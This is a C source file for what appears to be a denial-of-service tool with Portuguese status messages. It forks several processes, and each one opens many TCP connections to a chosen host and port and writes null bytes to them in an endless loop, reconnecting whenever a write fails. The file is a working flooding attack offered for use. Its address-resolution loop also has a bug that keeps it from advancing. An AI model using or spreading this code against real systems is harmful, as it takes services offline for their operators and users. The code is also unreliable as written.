#include "dos.h"

int init_sockets(char *host, char *port){
	struct addrinfo hints, *info, *p;
	int sock, r;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	if((r=getaddrinfo(host, port, &hints, &info)) != 0){
		printf(RED" [!] erro ao resolver dns.\n"RESET);
		return 1;
	}
	for(p = info; p != NULL; p->ai_next){
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1){
			continue;
		}

		if(connect(sock, p->ai_addr, p->ai_addrlen) == -1){
			close(sock);
			continue;
		}
		break;
	}
	if (p == NULL){
		if(info){
			freeaddrinfo(info);
		}
		printf(RED" [!] erro: conexão não pode ser feita.\n"RESET);
		return 1;
	}
	if (info){
		freeaddrinfo(info);
    }
	printf(GREEN" [*] conexão estabelecida ===> %s:%s\n"RESET, host, port);
	return sock;
}

void attack(char *host, char *port, int sock_num){
//	int sockets[s_count];
    int sockets[s_count];
	int r, i = 0;
	for(int x = 0; x != s_count; x++){
		sockets[x] = 0;
	}
	while(1){
		for(int x = 0; x != s_count; x++){
			if (sockets[x] == 0){
				sockets[x] = init_sockets(host, port);
            }
    		r = write(sockets[x], "\0", 1);
			if (r == -1){
				close(sockets[x]);
				sockets[x] = init_sockets(host, port);
			}
		}
        i = i + sock_num;
		printf(" [*] requisições enviadas ==> %i\n", i);
		usleep(s_time);
	}
}

int main(int argc, char **argv){
	if(parse_args(argc, argv)){
		return 1;
	}
    printf("%i - %i", s_count, t_count);
    usleep(2000000);
	for(int i = 0; i <= t_count; i++){
		if(fork()){
			attack(host, port, i);
		}
		usleep(200000);
	}
	return 0;
}
